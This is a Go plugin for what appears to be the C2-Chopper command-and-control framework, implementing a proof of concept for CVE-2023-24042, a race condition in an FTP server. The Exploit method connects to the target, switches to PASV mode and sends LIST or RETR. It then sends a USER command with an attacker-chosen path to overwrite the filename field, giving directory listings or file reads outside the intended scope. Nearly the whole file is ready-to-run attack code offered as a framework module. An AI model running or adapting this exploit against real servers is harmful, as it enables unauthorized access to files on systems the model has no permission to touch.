package main

import (
	"errors"
	"fmt"
	"net"

	"github.com/chopper-c2-framework/c2-chopper/core/domain/entity"
	"github.com/chopper-c2-framework/c2-chopper/core/plugins"
	"github.com/chopper-c2-framework/c2-chopper/core/services"
)

type NmapScanner struct {
	plugins.Plugin
	TaskService  services.ITaskService
	targetIp     string
	port         string
	action       string
	path         string
	existingFile string
	waitingTask  *entity.TaskModel
}

func New(service services.ITaskService) plugins.IPlugin {
	return &NmapScanner{
		Plugin: plugins.Plugin{
			Metadata: plugins.Metadata{
				Version:     "1.0",
				Author:      "C2-Chopper",
				Tags:        []string{"cve", "info-gathering", "race-condition"},
				ReleaseDate: "2023-05-01",
				Type:        plugins.InfoRetriever,
				SourceLink:  "https://github.com/Chopper-C2-Framework",
				Description: "A proof of concept for CVE-2023-24042 race condition.",
			},
			PluginInfo: plugins.PluginInfo{
				Name: "CVE-2023-24042",
				Options: map[string]string{
					"Ip":            "string",
					"Port":          "string",
					"Action":        "string",
					"Path":          "string",
					"Existing file": "string",
				},
				ReturnType: "string",
			},
		},
		TaskService: service,
	}
}

func (p NmapScanner) MetaInfo() *plugins.Metadata {
	return &p.Metadata
}

func (p NmapScanner) Info() *plugins.PluginInfo {
	return &p.PluginInfo
}

func (p NmapScanner) Options() map[string]string {
	return p.PluginInfo.Options
}

func (p *NmapScanner) SetArgs(args map[string]interface{}) error {
	arg1, ok := args["Ip"].(string)
	if !ok {
		return errors.New("Target ip is missing")
	}

	arg2, ok := args["Port"].(string)
	if !ok {
		return errors.New("Target port is missing")
	}

	var arg3 string
	arg3, ok = args["Action"].(string)
	if !ok {
		arg3 = "LIST"
	}
	if arg3 != "LIST" && arg3 != "RETR" {
		return errors.New("Action must be either LIST or RETR")
	}

	arg4, ok := args["Path"].(string)
	if !ok {
		return errors.New("Target path is missing")
	}

	if arg3 == "RETR" {
		arg5, ok := args["Existing file"].(string)

		if !ok {
			return errors.New("Existing file path is required for RETR command")
		}
		p.existingFile = arg5
	} else {
		p.existingFile = "/"
	}

	p.targetIp = arg1
	p.port = arg2
	p.action = arg3
	p.path = arg4
	return nil
}

func (p *NmapScanner) Exploit(Channel chan *entity.TaskResultModel, args ...interface{}) []byte {
	var output string
	sh, err := net.Dial("tcp", p.targetIp+":"+p.port)
	if err != nil {
		output = fmt.Sprintf("Failed to connect: %s", err.Error())
		return []byte(output)
	}

	// Connect to server
	logIn(sh)
	output = fmt.Sprint("Connecting to ", p.targetIp, " on port ", p.port, "...\n")

	// Enter the PASV mode
	sendData(sh, "PASV\r\n")
	response := receiveData(sh)
	dataPort := extractDataPort(response)
	output += fmt.Sprint("\tSwitched to PASV mode. port number: ", dataPort, "\n")

	// Enter the LIST/RETR command
	sendData(sh, p.action+" "+p.existingFile+"\r\n")
	output += fmt.Sprint("\tSending " + p.action + " /\n")

	// Delay the data connection
	// Send the USER command to overwrite the Filename field
	sendData(sh, "USER "+p.path+"\r\n")
	output += fmt.Sprint("\tSending USER to overwrite Filename field.\n")

	// Set up the data connection to the previous socket
	output += fmt.Sprint("\tConnecting to ", p.targetIp, " on data port ", dataPort, "...\n")
	dataConn, err := net.Dial("tcp", p.targetIp+":"+dataPort)
	if err != nil {
		output += fmt.Sprintln("Failed to connect to data port:", err)
		return []byte(output)
	}

	output += fmt.Sprint("\t\t"+p.action+" Executed:\n", receiveData(dataConn))
	return []byte(output)
}

func (p NmapScanner) IsWaitingForTaskResult() (bool, string) {
	if p.waitingTask == nil {
		return false, ""
	}
	return true, p.waitingTask.ID.String()
}
